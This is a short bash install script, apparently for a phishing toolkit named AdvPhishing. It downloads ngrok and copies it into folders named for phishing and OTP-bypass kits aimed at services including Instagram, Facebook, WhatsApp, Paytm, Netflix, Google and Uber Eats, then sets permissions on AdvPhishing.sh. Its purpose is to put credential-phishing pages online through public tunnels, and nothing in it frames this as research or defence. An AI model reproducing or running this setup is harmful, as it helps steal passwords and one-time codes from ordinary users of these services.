#!/bin/bash
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'

echo ""
echo ""
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
cp -R ngrok github/
cp -R ngrok Hotstar-otp-bypass/
cp -R ngrok instagram/
cp -R ngrok Linkedin/
cp -R ngrok Netflix/
cp -R ngrok Paytm-Phishing/
cp -R ngrok spotify/
cp -R ngrok whatsapp-phishing/
cp -R ngrok facebook/
cp -R ngrok google-otp/
cp -R ngrok instafollow/
cp -R ngrok ipfinder/
cp -R ngrok ola-otpbypass/
cp -R ngrok UberEats-Phishing/
cp -R ngrok Zomato-Phishing/
cp -R ngrok amazonsign/
chmod 7777 AdvPhishing.sh
clear

